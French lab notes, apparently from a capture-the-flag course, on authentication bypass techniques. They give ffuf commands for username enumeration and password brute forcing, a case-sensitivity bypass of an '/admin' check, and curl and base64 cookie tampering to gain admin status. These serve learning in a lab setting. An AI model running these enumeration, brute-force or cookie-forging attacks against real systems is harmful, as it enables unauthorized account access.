# Enumération d’utilisateurs (Username enumeration)

- Objectif : constituer une **liste de noms d’utilisateur valides** à partir d’un message d’erreur révélateur sur la page d’inscription.
- Méthode : automatiser avec **ffuf** en POSTant un formulaire et en recherchant le message d’erreur (`"username already exists"`).
- Exemple de commande :
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/signup \
     -mr "username already exists"
```
- Résultat : `valid_usernames.txt` — sert ensuite pour des attaques par force brute ciblées.
# Brute force de logins (credential stuffing / password spraying)

- Objectif : tester une liste de noms valides contre une liste de mots de passe pour trouver des accès.
- Attention éthique : respecter les règles du lab / autorisation.
- Exemple ffuf multi-wordlist (W1 = users, W2 = passwords) :
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/login \
     -fc 200
```
Filtre `-fc 200` : n’affiche que les réponses **non** 200 (ou inverse selon logique du site) — à adapter selon comportement de l’application.
# Logic flaws (failles logiques)

- Définition : contournement du flux logique de l’application (ex. bypass d’une vérification d’admin).
- Exemple courant : comparaison sensible à la casse → `if (url.substr(0,6) === '/admin')` peut être contournée avec `/adMin`.
- Conseil : tester variations d’URL, encodages, en-têtes, paramètres inattendus.
# Manipulation de cookies
- Les cookies peuvent contenir des **flags** (ex. `logged_in`, `admin`) en clair. Les éditer peut modifier l’état de la session.
- Exemple (curl) :
```bash
curl http://MACHINE_IP/cookie-test               # Not Logged In
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test   # Logged In As A User
curl -H "Cookie: logged_in=true; admin=true"  http://MACHINE_IP/cookie-test   # Logged In As An Admin (flag possible)
```
# Hashing vs Encoding

- **Hashing** : irréversible (MD5, SHA-1, SHA-256, SHA-512). Même entrée → même sortie. Utilisé pour stocker mots de passe. On peut tenter de "craquer" via tables/rainbow (CrackStation).
    - Exemple MD5 de `1` : `c4ca4238a0b923820dcc509a6f75849b`
- **Encoding** : réversible (base64, base32). Sert à transporter des données lisibles.
    - Exemple cookie base64 :  
        `session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==` → décode en `{"id":1,"admin": false}`
    - On peut modifier la structure JSON, ré-encoder en base64, et renvoyer le cookie pour changer `admin` à `true` si la valeur n’est pas signée.
